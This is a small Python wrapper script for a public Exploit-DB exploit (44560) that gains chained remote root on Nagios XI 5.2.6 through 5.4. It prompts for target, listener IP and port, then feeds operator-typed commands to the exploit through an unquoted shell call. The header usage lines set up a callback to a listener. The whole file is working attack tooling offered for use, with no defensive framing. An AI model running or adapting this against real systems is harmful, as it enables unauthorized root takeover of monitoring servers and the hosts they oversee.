# Usage: 44560.py -r <appliance_ip> -l <listener_ip> -p <listener_port>
#       44560.py -r <appliance_ip> -c 'touch /tmp/foooooooooooo'
# /usr/share/exploitdb/exploits/php/webapps/44560.py
# Nagois XI 5.2.[6-9], 5.3, 5.4 Chained Remote Root
import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


rhost = input(f"{Colors.red}(Chained Remote Root){Colors.end} [Enter RHOSTS]:~#")
lhost = input(f"{Colors.red}(Chained Remote Root){Colors.end} [Enter LHOST]:~#")
lport = int(input(f"{Colors.red}(Chained Remote Root){Colors.end} [Enter LPORT]:~#"))
while True:
    cmd = input(f"{Colors.red}(Chained Remote Root){Colors.end} [Comand~Line]:~#")
    if cmd:
        sub.call(f"python3 /usr/share/exploitdb/exploits/php/webapps/44560.py -r {rhost} -l {lhost} -p {lport} -c {cmd}", shell=True)

    elif cmd == "back" or cmd == "exit":
        break
    else:
        break
